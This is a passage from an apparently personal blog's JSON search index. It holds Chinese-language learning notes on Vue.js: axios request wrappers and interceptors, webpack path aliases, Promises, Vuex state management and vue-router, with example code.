&quot;http://123.207.32.32:8000&quot;, timeout: 5000 &#125;) instance(config).then(res =&gt; &#123; console.log(res); success(res) &#125;).catch(err =&gt; &#123; console.log(err); failure(err) &#125;)&#125;//main.jsrequest(&#123; url:&quot;/home/multidata&quot;&#125;).then(res =&gt; &#123; console.log(res);&#125;).catch(err =&gt; &#123; console.log(err);&#125;) 4.2.2.4 最终使用 axios的实例的返回值就是promise 因为instance可以直接使用.then .catch方法 1234567891011121314151617181920//request.jsimport axios from &quot;axios&quot;;export function request(config) &#123; // 1.创建axios的实例 const instance = axios.create(&#123; baseURL: &quot;http://123.207.32.32:8000&quot;, timeout: 5000 &#125;) //发送真正的网络请求 return instance(config)&#125;//main.jsrequest(&#123; url:&quot;/home/multidata&quot;&#125;).then(res =&gt; &#123; console.log(res);&#125;).catch(err =&gt; &#123; console.log(err);&#125;) 如果到时候axios不能用了，只需要改4-10行的代码就可以 了 5.axios拦截器 四种拦截器：请求成功/失败 、响应成功/失败：服务器没有具体是数据过来，传了错误码 12345678910111213141516171819202122232425262728293031323334export function request(config) &#123; // 1.创建axios的实例 const instance = axios.create(&#123; baseURL: &quot;http://123.207.32.32:8000&quot;, timeout: 5000 &#125;) // 2.axios的拦截器 // 全局 axios.interceptors // 实例 instance.interceptors // 请求拦截 instance.interceptors.request.use(config =&gt; &#123; console.log(config); //拦截下来的是配置 拦截了配置还得给返回回去 不然就会请求失败 // 1.可以通过拦截的形式给config中的一些信息不符合服务器要求 设置header什么的 // 2.可能在请求时 show 加载中的图标 // 3.某些网络请求 是必须携带一些信息 例如登录 带token return config; &#125;, err =&gt; &#123; console.log(err); &#125;); // 响应拦截 instance.interceptors.response.use(res =&gt; &#123; //因为一般用的时候只用data就可以了 // 拦截了结果得返回出去 不然main.js log.res时undefined // console.log(res); return res.data; &#125;, err =&gt; &#123; console.log(err); &#125;); // 3.发送真正的网络请求 return instance(config)&#125;","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"路径别名配置","slug":"vue/07 封装tabbar的知识","date":"2021-04-20T16:00:00.000Z","updated":"2021-04-20T16:00:00.000Z","comments":false,"path":"learningNotes/vue/07 封装tabbar的知识","link":"learningNotes/vue/07 封装tabbar的知识","permalink":"https://shylees.github.io/learningNotes/vue/07%20%E5%B0%81%E8%A3%85tabbar%E7%9A%84%E7%9F%A5%E8%AF%86","excerpt":"","text":"[toc] 在webpack.base.conf.js 里 123456789resolve:&#123; extensions:[&#x27;.js&#x27;,&#x27;.vue&#x27;,&#x27;.json&#x27;], alias:&#123; &#x27;@&#x27;:resolve(&#x27;src&#x27;), &#x27;assets&#x27;:resolve(&#x27;src/assets&#x27;), &#x27;components&#x27;:resolve(&#x27;src/components&#x27;), &#x27;views&#x27;:resolve(&#x27;src/views&#x27;), &#125;&#125; 使用时： 123&lt;template&gt; &lt;img solt=&#x27;item-icon&#x27; src=&#x27;~assets/img/tabbar/home.svg&#x27;&gt;&lt;/template&gt;","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"Promise 简述","slug":"vue/08 Promise","date":"2021-04-20T16:00:00.000Z","updated":"2021-04-20T16:00:00.000Z","comments":false,"path":"learningNotes/vue/08 Promise","link":"learningNotes/vue/08 Promise","permalink":"https://shylees.github.io/learningNotes/vue/08%20Promise","excerpt":"","text":"1. Promise简介 Promise 是异步编程的一种解决方案 2. 网络请求的回调地狱 简述： 需要通过url1从服务器加载一个数据data1，data1中包含了下一个请求的url2； 需要通过data1取出url2，从服务器加载数据data2，data2包含了下一个请求的url3； 需要通过data2取出url3，从服务器加载数据data3，data3包含了下一个请求的url4； 发送网络请求url4，获取最终的数据data4 123456789$.ajax(&#x27;url1&#x27;,function(data1)&#123; $.ajax(data1[&#x27;url2&#x27;],function(data2)&#123; $.ajax(data1[&#x27;url3&#x27;],function(data3)&#123; $.ajax(data1[&#x27;url4&#x27;],function(data4)&#123; console.log(data4); &#125;) &#125;) &#125;)&#125;) 这样的代码难看且不易维护 更加期望用一种更加优雅的方式来进行这种异步操作——promise 3.定时器的异步事件 使用定时器模拟异步操作 12345// 1. 使用setTimeoutsetTimeout(function()&#123; let data = &#x27;Hello World&#x27; console.log(data);&#125;,1000) 上述是我们过去的处理方式，将其转换成promise代码： 123456789101112131415// 参数 -&gt; 函数(resolve,reject)// resolve,reject本身也是函数// 链式编程new Promise((resolve,reject) =&gt; &#123; setTimeout(function()&#123; //成功时调用 resolve resolve(&#x27;Hello World&#x27;) //失败时 调用reject reject(&#x27;Error Data&#x27;) &#125;,1000)&#125;).then(data =&gt; &#123; console.log(data);&#125;).catch(error =&gt; &#123; console.log(error);&#125;) 什么时候会用到promise？ 一般是有异步操作时，使用promise对这个异步操作进行封装 怎么使用 new -&gt; 构造函数（1.保存了一些状态信息 2.执行传入的函数） 在执行传入的回调函数时，会传入两个参数，resolve，reject，其本身也是函数 3.Promise三种状态 在开发中有异步操作时，就可以给异步操作包装一个Promise。异步操作之后会有三种状态: pending：等待状态，如：正在进行网路请求，或者定时器没有到时间 fulfill：满足状态，当主动回调了resolve时，就处于该状态，并且会回调.then() reject：拒绝状态，当主动回调了reject时，就处于该状态，并且会回调.catch() 1234567891011// promise 的另外处理形式new Promise((resolve,reject) =&gt;&#123; setTimeout(() =&gt; &#123; resolve(&#x27;Hello Vuejs&#x27;) // reject(&#x27;error message&#x27;) &#125;,1000)&#125;).then(data =&gt; &#123; console.log(data);&#125;,err =&gt; &#123; console.log(err)&#125;) 4 Promise 链式调用 在Promise的流程图中，无论时then还是catch都可以返回一个Promise对象 所以，代码可以进行链式调用： 直接通过Promise包装新的数据，将Promise对象返回 Promise.resolve()：将数据包装成Promise对象，并且在内部调用回调resolve()函数 Promise。reject()：将数据包装成Promise对象，并且在内部回调reject()函数 123456789101112131415161718192021222324252627282930//wapped into //网络请求：aaa -&gt; 自己处理// 处理: aaa111 -&gt; 自己处理// 处理: aaa111222 -&gt; 自己处理new Promise((resolve,reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve(&#x27;aaa&#x27;) &#125;,1000)&#125;).then(res =&gt; &#123; //自己处理 console.log(res) //对结果进行第一次处理 return new Promise((resolve) =&gt; &#123; resolve(res + &#x27;111&#x27;) &#125;)&#125;).then(res =&gt; &#123; //自己处理 console.log(res) //对结果进行第二次处理 return new Promise((resolve) =&gt; &#123; resolve(res + &#x27;222&#x27;) &#125;)&#125;).then(res =&gt; &#123; console.log(res)&#125;).catch(err =&gt; &#123; console.log(err)&#125;) 链式调用简写 if希望数据直接包装成Promise.resolve，那么在then中可以直接返回数据 当把return Promise.resolve(data) 改成return data时结果也是一样的 1234567891011121314 //对结果进行第一次处理 return new Promise((resolve) =&gt; &#123; resolve(res + &#x27;111&#x27;) &#125;)// 1. 使用return Promise.resolve/rejectreturn Promise.resolve(res + &#x27;111&#x27;)/ return Promise.reject(&#x27;error message&#x27;) // 2. 省略Promise.resolvereturn res + &#x27;111&#x27;/ throw &#x27;error message&#x27; 5. 链式调用二 简述：如果一个结果需要两个请求成功后才能得到 那没有使用Promise时是这样的 12345678910111213141516171819202122232425262728let isResult1 = false;let isResult2 = false;//请求1$.ajax(&#123; url:&#x27;&#x27;, success:function()&#123; console.log(&#x27;result1&#x27;); isResult1 = true; handleResult() &#125;&#125;)//请求2$.ajax(&#123; url:&#x27;&#x27;, success:function()&#123; console.log(&#x27;result2&#x27;); isResult2 = true; handleResult() &#125;&#125;)function handleResult()&#123; if(isResult1 &amp;&amp; isResult2)&#123; &#125;&#125; Promise.all 使用Promise 123456789101112131415161718192021Promise.all([ new Promise((reslove,reject) =&gt; &#123; $.ajax(&#123; url:&#x27;&#x27;, success:function(data)&#123; resolve(data) &#125; &#125;) &#125;), new Promise((resolve,reject) =&gt; &#123; $.ajax(&#123; url:&#x27;&#x27;, success:function(data)&#123; resolve(data) &#125; &#125;) &#125;)]).then(results =&gt; &#123; results[0] results[1]&#125;)","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"},{"name":"es6","slug":"es6","permalink":"https://shylees.github.io/tags/es6/"}]},{"title":"09 Vuex","slug":"vue/09 Vuex","date":"2021-04-20T16:00:00.000Z","updated":"2021-05-01T16:00:00.000Z","comments":false,"path":"learningNotes/vue/09 Vuex","link":"learningNotes/vue/09 Vuex","permalink":"https://shylees.github.io/learningNotes/vue/09%20Vuex","excerpt":"","text":"[toc] 1.Vue的概念和作用解析 1.1 Vuex 是做什么的 官方解释：Vuex是一个专门为Vue.js应用程序开发的状态管理模式。 采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。 Vuex也集成到Vue的官方调试工具devtools extension，提供了诸如零配置的time-travel调试、状态快照导入导出等高级调试功能。 状态管理模式相当于 封装一个大家都能访问的对象里 但Vuex跟自己封装的对象不一样的就是Vuex 实现了响应式 Vuex就是为了提供这样一个在多个组件间共享状态的插件 1.2 管理什么状态呢？ 比如：用户的登录状态、用户名称、头像等 比如：商品的收藏、购物车中的物品等 这些状态信息，我们都可以放在统一的地方，对它进行保存和管理，而且他们还是响应式的 1.3 单页面的状态管理 State：状态—data中的属性 View：视图层，可以针对State的变化，显示不同的信息—模板 Actions：用户的各种操作，会导致状态的改变—方法 1.4 多界面状态管理 Vuex–全局单例模式 （大管家）—Vuex背后的思想 将共享的状态抽取出来，交给大管家，统一管理 每个视图，按照规定好的规定，进行访问和修改等操作 1.5 Vuex状态管理图例 Devtools ：记录每一次status修改的状态，所以官方网站推荐改vuex时，在这里改 如果绕过mutations，就没法跟踪修改的状态 mutations 同步操作，所以只有同步操作时可以绕过actions actions 异步操作时 如网络请求 backend：后端 1.6 安装devtools插件 在f12中 的更多 如果又看到vue 就安装成功 2. Vuex的使用 2.1 Vuex的下载 1npm install vuex --save @3.0.1 2.2 Vuex使用 把Vuex插件导入 123456789//main.jsimport Vuex from &#x27;vuex&#x27;//1.安装插件Vue.use(Vuex)//2.创建实例 一般不在main中写，重建文件夹，store，创建index.js 导入模块 安装插件 创建store对象 导出对象 在main挂载Vue.prototype.$store = store 在state保存状态 在mutations写方法 修改state 12345678910111213141516171819202122232425262728293031323334import Vue from &#x27;vue&#x27;import Vuex from &#x27;vuex&#x27;//1.安装插件Vue.use(Vuex) //底层会执行这个插件的方法 ： Vuex.install//2.创建对象const store = new Vuex.Store(&#123; state:&#123; counter:1000 &#125;, //保存状态 mutations: &#123; //方法 increment(state) &#123; state.counter++; &#125;, decrement(state) &#123; state.counter--; &#125; &#125;, actions:&#123;&#125;, getters:&#123;&#125;, modules:&#123;&#125;&#125;)//3.导出store对象export default store//在main.js挂载import stroe from &#x27;./stroe&#x27;//这样才会 多个组件使用它Vue.prototype.$store = store 在其他页面使用counter 使用state的状态 $store.state.counter 使用里面的方法 $store.commit(“方法名”) 123456789101112131415161718192021222324252627282930313233//app.vue&lt;template&gt; &lt;h2&gt;------app内容：直接compontens 修改 state -------&lt;/h2&gt; &lt;h2&gt;&#123;&#123;$store.state.counter&#125;&#125;&lt;/h2&gt; &lt;button @click=&#x27;$store.state.counter++&#x27;&gt;+&lt;/button&gt; &lt;h2&gt;--------vuex内容：使用nutations--------&lt;/h2&gt; &lt;button @click=&#x27;sub&#x27;&gt;-&lt;/button&gt;&lt;/template&gt;&lt;script&gt;import HelloVuex from &quot;./components/HelloVuex&quot;;export default &#123; name: &quot;App&quot;, components: &#123; HelloVuex, &#125;, data() &#123; return &#123; message: &quot;我是app组件&quot;, // counter: 0, &#125;; &#125;, methods: &#123; add() &#123; return this.$store.commit(&quot;increment&quot;); &#125;, sub() &#123; return this.$store.commit(&quot;decrement&quot;); &#125;, &#125;,&#125;;&lt;/script&gt; 3.Vuex核心概念（p133 2021/05/01) 3.1 State 单一状态树 相当于data 一个项目就一个store 3.2 Getters 相当于computed 与计算属性相似，如果要发生什么变化再给其他组件使用 如果要对数据产生什么变化，就直接在getters变化后，去使用就可以了 在getters定义计算属性 12345getters()&#123; powCounter(state)&#123; return state.counter * state.counter; &#125;&#125; 在app的template使用计算属性 因为是计算属性 所以可以不用加括号 1234&lt;template&gt; &lt;h3&gt;原来的方法：&#123;&#123;$store.state.counter * $store.state.counter&#125;&#125;&lt;/h3&gt; &lt;h3&gt;使用getters:&#123;&#123;$store.getters.powCounter&#125;&#125;&lt;/h3&gt;&lt;/template&gt; 如果要使用对象中的某一个筛选对象，例如学生中选年龄大于12岁的,加学生个数，传入年龄 选出年龄大的学生 // index.js state: &#123; //保存状态 counter: 1000, students: [ &#123; id: 111, name: 'why1', age: 11 &#125;, &#123; id: 112, name: 'why2', age: 12 &#125;, &#123; id: 113, name: 'why3', age: 13 &#125;, &#123; id: 114, name: 'why4', age: 14 &#125;, ] &#125;, 1234567891011121314+ &gt; 使用计算属性 &gt; &gt; ~~~vue &gt; &lt;template&gt; &gt; &lt;h3&gt;&#123;&#123;more12stu&#125;&#125;&lt;/h3&gt; &gt; &lt;/template&gt; &gt; &lt;script&gt; &gt; computed: &#123; &gt; more12stu() &#123; &gt; return this.$store.state.students.filter((s) =&gt; s.age &gt; 12); &gt; &#125;, &gt; &#125;, &gt; &lt;/script&gt; &gt; &gt; 要是别的页面要用就得复制过去，很麻烦 使用getters 123456789101112131415//index.js getters: &#123; //大于12的学生 more12stu(state) &#123; return state.students.filter(s =&gt; s.age &gt; 12) &#125;, //大于12的学生的个数 more12stuLength(state,getters) &#123; return getters.more12stu.length; &#125;, //大于age的学生 moreAgestu(state)&#123; return age =&gt; state.students.filter(s =&gt; s.age &gt; age) &#125; &#125;, 使用getters的数据 12345678910//vue&lt;h3&gt;年龄大于20的学生：&#123;&#123; $store.getters.more12stu &#125;&#125;&lt;/h3&gt;//大于12的学生的个数 可以直接 写length&lt;h3&gt;&#123;&#123; $store.getters.more12stu.length &#125;&#125;&lt;/h3&gt;//也可以再写一个计算属性&lt;h3&gt;&#123;&#123; $store.getters.more12stuLength &#125;&#125;&lt;/h3&gt;//年龄大于age的学生&lt;h3&gt;&#123;&#123; $store.getters.moreAgestu(11) &#125;&#125;&lt;/h3&gt; 3.3 Mutation 相当于methods vuex的store状态的更新唯一方式：commit mutation mutation包括两个部分： 字符串的事件类型type increment 一个回调函数handler，该回调函数的第一个参数是state(state)&#123;state.couter--&#125; mutation的定义方式： 123456//index.jsmutatuions:&#123; increment(state)&#123; state,counter-- &#125;&#125; mutation的更新： 1234//vueadd:function()&#123; this.$store.commit(&#x27;increment&#x27;)&#125; 3.3.2 传入参数 参数被称为mutation的载荷Payload 点击＋任意数量 添加学生 //vue &lt;button @click='addcount(5)'&gt;+5&lt;/button&gt; &lt;button @click=&quot;addstu&quot;&gt;添加学生&lt;/button&gt; 1234567891011121314+ 写方法 ~~~js //vue methods:&#123; addcount(count)&#123; return this.$store.commit(&#x27;incrementcount&#x27;,count); &#125;, addstu() &#123; const stu = &#123; id: 115, name: &quot;why5&quot;, age: 15 &#125;; return this.$store.commit(&quot;addstu&quot;, stu); &#125;, &#125; mutation 123456789//index.jsmutations:&#123; incrementcount(state,count)&#123; state.counter += count; &#125;, addstu(state, stu) &#123; state.students.push(stu) &#125;&#125; 3.3.3 mutation的提交风格 1234567891011//vue methodsaddcount(count) &#123; //1. 普通提交方式 return this.$store.commit(&quot;incrementcount&quot;, count); //2.特殊的封装方式 return this.$store.commit(&#123; type: &quot;incrementcount&quot;, count, &#125;);&#125;, 123456789101112//index.js mutation incrementcount(state, count) &#123; console.log(count); // 如果是普通提交 返回的是 count的数值 // 如果是封装的提交 返回的是整个参数对象 // 这里就应该使用 payload参数命名 然后使用layload.count state.counter += count&#125;,==&gt;incrementcount(state,layload)&#123; state.counter += layload.count;&#125; 3.3.4 vuex数据响应式原理(对组件也是一个道理) 在里面的定义的每个属性 都会有一个Dep[watcher…] watcher会监听每一个页面的属性变化 3.3.4.1在mutations增加删除数据事如何做到响应式 12345678910111213mutations:&#123; updateInfo(state)&#123; //这样无法响应式 就是代码改了 无法在页面改 因为没有监听 state.info[&#x27;address&#x27;] = &#x27;china&#x27;; //使用Vue.set方法就可以 Vue.set(state.info , &#x27;address&#x27; , &#x27;china&#x27;); //删除数据时 使用delete删除无法响应式 delete state.info.age; //使用Vue.delete可以 Vue.delete(state.info , &#x27;age&#x27;); &#125;&#125; 3.3.5 mutation常量类型 把vue里面methods里面commit括号里的”increment“，和index.js里mutations里的increment变成一个常量，这样不会写错 在store文件夹下面 新建 mutations.types.js 用来导出常量 12//mutations.types.jsexport const INCREMENT = &quot;increment&quot; 导入文件，修改vue里的”increment“ 1234import &#123; INCREMENT &#125; from &quot;../store/mutations.types&quot;;add() &#123; return this.$store.commit(INCREMENT);&#125;, 导入文件，修改index.js的increment 1234import &#123; INCREMENT &#125; from &#x27;./mutations.types&#x27;[INCREMENT](state) &#123; state.counter++;&#125;, 3.4 Action 相当于异步methods 在mutations中进行异步操作，devtools插件没有办法追踪到变化，页面变化，但是控制台的代码没有变 所以用actions替代mutations 12345678910111213141516//index.jsmutations:&#123; updateInfo(state)&#123; return state.info.name = &#x27;why&#x27;; &#125;&#125;actions:&#123; //context:上下文 可看成state 不能跳过mutations //传参数 aUpdateInfo(context,payload)&#123; setTimeOut(() =&gt; &#123; context.commit(&#x27;updateInfo&#x27;,payload); console.log(paylog); &#125;,1000) &#125;&#125; 在vue中操作 123456&lt;button @click=&quot;updateInfo&quot;&gt;更新&lt;/button&gt;updateInfo()&#123; //this.$store.commit(&#x27;updateInfo&#x27;); //不会改代码 this.$store.dispatch(&#x27;aUpdateInfo&#x27;,&#x27;我是payload&#x27;); //这样才会经过actions mutations 然后被插件检测到&#125; 在修改成功的时候通知用户 一般在commit的地方就修改成功了 正常写法： 123456789101112//vueupdateInfo()&#123; //this.$store.dispatch(&#x27;aUpdateInfo&#x27;,()=&gt;&#123; // console.log(&quot;修改成功&quot;); //&#125;) return this.$store.dispatch(&#x27;aUpdateInfo&#x27;,&#123; message:&quot;我是携带信息&quot;, success:()=&gt;&#123; console.log(&quot;修改成功&quot;); &#125; &#125;)&#125; 1234567891011//index.jsactions:&#123; aUpdateInfo(context,payload)&#123; setTimeout(() =&gt; &#123; context.commit(&#x27;updateInfo&#x27;); //一般在这会修改成功 //payload() console.log(layload.message); payload.success(); &#125;,1000) &#125;&#125; 优雅的写法 使用promise 12345678//vueupdateInfo()&#123; return this.$store .dispatch(&quot;aUpdateInfo&quot;) .then(res =&gt; &#123; console.log(res) &#125;)&#125; 12345678910//index.jsaUpdateInfo(context,payload)&#123; return new Promise((resolve,reject) =&gt; &#123; setTimeout(() =&gt; &#123; context.commit(&#x27;updateInfo&#x27;); console.log(payload); resolve(111); &#125;) &#125;)&#125; 3.5 Module 因为vue使用单一状态树意味着很多状态都给vuex来管理 当应该很复杂时store就很臃肿 所以vuex允许我们将store分割城模块，每个模块拥有自己的state、mutations、actions、getters 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950//index.jsconst moduleA = &#123; state: &#123; name: &quot;lisi&quot; &#125;, mutations: &#123; updatelisi(state.payload)&#123; state.name=payload; &#125; &#125;, actions: &#123; aupdatelisi(context) &#123; //这里commit的是上面部分的mutations console.log(context);//有根的各种东西 setTimeout(() =&gt; &#123; context.commit(&#x27;updatelisi&#x27;, &#x27;wangwu&#x27;); &#125;, 1000) &#125; &#125;, getters: &#123; fullname(state) &#123; return state.name + &#x27; getters&#x27; &#125;, fullname(state, getters ,rootState)&#123; //rootState 根的state return getters.fullname + rootState.counter; &#125; &#125;&#125;const store = new Vuex.Store(&#123; ... modules: &#123; a: moduleA &#125;&#125;)//vue使用&lt;h3 style=&quot;color: red&quot;&gt;&#123;&#123; $store.state.a.name &#125;&#125;&lt;/h3&gt;&lt;h3 style=&quot;color: red&quot;&gt;&#123;&#123; $store.getters.fullname &#125;&#125;&lt;/h3&gt;&lt;h3 style=&quot;color: red&quot;&gt;&#123;&#123; $store.getters.fullname2 &#125;&#125;&lt;/h3&gt;&lt;button @click=&quot;change&quot;&gt;改名&lt;/button&gt;&lt;button @click=&quot;asyncChange&quot;&gt;异步改名&lt;/button&gt;methods:&#123; change()&#123; this.$store.commit(&#x27;updatelisi&#x27;,&quot;张三&quot;); &#125;, asyncChange() &#123; this.$store.dispatch(&quot;aupdatelisi&quot;); &#125;,&#125; 3.6 actions的写法 对象的解构 123456789actions:&#123; add(context)&#123; ... &#125;, //也可以写成 add(&#123;state,commit,rootState&#125;)&#123; ... &#125;&#125; 解构： 1234567const obj = &#123; name:&#x27;11&#x27;, age:18, height:1.88,&#125;const &#123;age , name&#125; = obj; 4.store文件夹的目录组织 把mutations、actions、getters全部抽出文件 导入到index.js 建modules文件夹，放moduleA.js …文件 导入index.js state一般不抽","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"06 vue-router","slug":"vue/06 vue-route","date":"2021-03-22T16:00:00.000Z","updated":"2021-03-28T16:00:00.000Z","comments":false,"path":"learningNotes/vue/06 vue-route","link":"learningNotes/vue/06 vue-route","permalink":"https://shylees.github.io/learningNotes/vue/06%20vue-route","excerpt":"","text":"[toc] (2021/03/23-29 p100-118) 1.认识路由 1.1 路由 路由：通过互联的网络把信息从源地址传输到目的地的活动 路由器提供了两种机制：路由和转送 ​ 路由是决定数据包从来源到目的地的路径 ​ 转送将输入端的数据转移到合适的输出端 路由表：本质上就是一个映射表，决定了数据包的指向 1.2 前端渲染 后端渲染(p101) 后端渲染：jsp：Java serve page 后端路由：后端处理url和页面之间的映射关系 前后端分离：ajax SPA单页面富应用：在前后端分离的基础上加了一层前端路由 前端路由的核心：改变url，但页面不进行整体刷新 1.3 url的hash和HTML5的history 如何实现改变url，不刷新页面 1.3.1 URL的hash url的hash也就是锚点（#），本质上是改变window.location的herf属性 可以通过直接赋值location.hash来改变href，但是页面不发生刷新 1.3.2 HTML5的history history.pushState(&#123;&#125;,'','home') history.back()可以回退 左箭头也能回退 history.replaceState(&#123;&#125;,'','home') 不能回退 history.go() history.go(-1) == history.back() 正数前进 负数后退 history.forward() history.forward() == history.go(1) 2.vue-router基本使用 2.1 认识vue-router 目前前端流行的三大框架，都有自己的路由实现： Angular的ngRouter React的ReactRouter Vue的vue-router vue-router是Vue.js官方的路由插件，和vue.js是深度集成的，适合用于构建单页面应用 官网：https://router.vuejs.org/zh/ vue-router是基于路由和组件的 路由用于设定访问路径，将路径和组件映射起来 在vue-router的单页面应用中，页面的路径的改变就是组件的切换 2.2 安装和使用vue-router 2.2.1安装 步骤一：安装 npm install vue-router --save 步骤二：在模块化工程中使用它（因为是一个插件，所以可以通过Vue.use()来安装路由功能） 导入路由对象，并且调用Vue.use(VueRouter) 创建路由实例，并且传入路由映射配置 在Vue实例中挂载创建的路由实例 1234567891011121314151617181920212223//router/index.js 搭建路由的框架//配置路由相关的信息import Vue from &#x27;vue&#x27;import Router from &#x27;vue-router&#x27;//1.通过Vue.use(插件),安装插件Vue.use(Router)//2.创建VueRouter对象const routes = [&#123;&#125;]const router = new Router(&#123; //配置路由和组件之间的应用关系 routes&#125;)//3.将其传入vue实例中export default router 12345678910111213141516//main.jsimport Vue from &#x27;vue&#x27;import App from &#x27;./App&#x27;//router文件夹 会自动导入indeximport router from &#x27;./router&#x27;Vue.config.productionTip = false/* eslint-disable no-new */new Vue(&#123; el: &#x27;#app&#x27;, router, //将路由传入vue实例 render: h =&gt; h(App)&#125;) 2.2.2使用(p104-110) 1.使用步骤 使用vue-router的步骤： 创建路由组件 配置路由映射，组件和路径映射的关系 使用路由：通过&lt;router-link&gt;和&lt;router-view&gt; &lt;router-link&gt;该标签是一个vue-router中已经内置的组件，会被渲染成一个&lt;a&gt;标签 &lt;router-view&gt; 该标签会根据当前路径，动态渲染出不同的组件 网页的其他内容，比如顶部的标题/导航，等会和&lt;router-view&gt;处于同一个等级 在路由切换时，切换的是&lt;router-view&gt;挂载的组件，其他内容不会发生改变 123456789101112131415161718192021222324252627282930313233//创建新的组件//Home.vue&lt;template&gt; &lt;div&gt; &lt;h2&gt;我是首页&lt;/h2&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &quot;Home&quot;,&#125;;&lt;/script&gt;&lt;style&gt;&lt;/style&gt;//About.vue&lt;template&gt; &lt;div&gt; &lt;h2&gt;我是关于&lt;/h2&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &quot;About&quot;,&#125;;&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 123456789101112131415161718192021222324252627282930//配置映射 index.js//配置路由相关的信息import Vue from &#x27;vue&#x27;import Router from &#x27;vue-router&#x27;//导入组件import Home from &#x27;../components/Home.vue&#x27;import About from &#x27;../components/About.vue&#x27;//1.通过Vue.use(插件),安装插件Vue.use(Router)//2.创建VueRouter对象const routes = [&#123; path: &#x27;/home&#x27;, component: Home&#125;, &#123; path: &#x27;/about&#x27;, component: About&#125;]const router = new Router(&#123; //配置路由和组件之间的应用关系 routes&#125;)//3.将其传入vue实例中export default router 1234567891011121314151617181920//要把组件写到App.vue才能渲染出来&lt;template&gt; &lt;div id=&quot;app&quot;&gt; &lt;!-- router-link 与a标签类似 会将a标签渲染在页面上 --&gt; &lt;router-link to=&quot;/home&quot;&gt;首页&lt;/router-link&gt; &lt;router-link to=&quot;/about&quot;&gt;关于&lt;/router-link&gt; &lt;!-- 决定组件展示在页面的位置 --&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &quot;App&quot;,&#125;;&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 2.路由的默认路径： 1234567891011//index.jsconst routes = [&#123; path: &#x27;/&#x27;, // ‘/’ 加不加都可以 redirect: &#x27;/home&#x27;&#125;, &#123; path: &#x27;/home&#x27;, component: Home&#125;, &#123; path: &#x27;/about&#x27;, component: About&#125;] 在routes中又配置了一个映射， path配置的是根路径:/ redirect是重定向，也就是将根路径重定向到/home的路径下，这样就可以打开就默认是home了 3.修改url的展示模式 因为默认是hash展示 会有# 没那么好看 把mode改成history 就可以没有# 1234567//index.jsconst router = new Router(&#123; //配置路由和组件之间的应用关系 routes, mode: &#x27;history&#x27;&#125;) 4.router-link补充 属性： to：用于指定跳转的路径 tag：指定渲染成什么组件 例&lt;router-link tag='li'&gt;&lt;/router-link&gt;渲染成&lt;li&gt;&lt;/li&gt; replace：不会留下history记录 例&lt;router-link replace&gt;&lt;/router-link&gt; active-class：当&lt;router-link&gt;对应的路由匹配成功时，会自动给当前元素设置一个 router-link-active的class，设置active-class可以修改默认的名称 例&lt;router-link active-class='active'&gt;&lt;/router-link&gt; 如果很多要改的话 可以在 1234567//index.jsconst router = new Router(&#123; //配置路由和组件之间的应用关系 routes, mode: &#x27;history&#x27;, //改变url的展示方式 linkActiveClass: &#x27;active&#x27; //修改默认的点击赋给的类名&#125;) 5.不使用router-link，使用代码修改路径 12345678910111213141516171819202122232425262728293031323334353637//App.vue&lt;template&gt; &lt;div id=&quot;app&quot;&gt; &lt;h2&gt;我是app组件&lt;/h2&gt; &lt;!-- router-link 与a标签类似 相当于将a标签渲染在页面上 --&gt; &lt;!-- &lt;router-link to=&quot;/home&quot;&gt;首页&lt;/router-link&gt; &lt;router-link to=&quot;/about&quot;&gt;关于&lt;/router-link&gt; --&gt; &lt;!-- 1.用标签直接写 加上触发指定方法 --&gt; &lt;button @click=&quot;homeClick&quot;&gt;首页&lt;/button&gt; &lt;button @click=&quot;aboutClick&quot;&gt;关于&lt;/button&gt; &lt;!-- 决定组件展示在页面的位置 --&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &quot;App&quot;, //2.定义方法 methods: &#123; homeClick() &#123; //3.通过代码的方式修改路由 vue-router //push == pushState 可以返回 // this.$router.push(&quot;/home&quot;); this.$router.replace(&quot;/home&quot;); &#125;, aboutClick() &#123; this.$router.push(&quot;/about&quot;); &#125;, &#125;,&#125;;&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 6.动态路由的使用(p108) 某些情况下，一个页面的path路径可能是不确定的，比如进入用户页面的时候，希望是 /user/aaaa 或者 /user/bbbb 除了有前面的/user 外 ，后面还跟上了用户ID 这种path和Component的匹配关系，称之为动态路由==》也是路由传递数据的一种方式 步骤： 添加组件User.vue 添加路由映射 1234567891011//不使用到动态路由的话&#123; path:&#x27;/user&#x27;, component:User&#125;//使用动态路由&#123; path:&#x27;/user/:id&#x27;, component:User&#125; 在User.vue组件中使用动态路由传递的数据 1234567891011121314151617181920&lt;template&gt;&lt;div&gt; //id 与上面 :后面的名称一样 &lt;h2&gt;&#123;&#123; $router.params.id &#125;&#125;&lt;/h2&gt; //或者使用组件下面获取的数据 &lt;h2&gt;&#123;&#123; userId &#125;&#125;&lt;/h2&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &quot;User&quot;, computed: &#123; userId() &#123; return this.$route.params.userId; &#125;, &#125;,&#125;;&lt;/script&gt; 在展示的组件 App.vue添加 此信息 1234567891011121314151617181920&lt;template&gt; &lt;div id=&quot;app&quot;&gt; //直接添加 没有动态获取的id &lt;router-link to=&quot;/user/zhangsan&quot;&gt;用户&lt;/router-link&gt; //需要获取下面动态数据 v-bind &lt;router-link 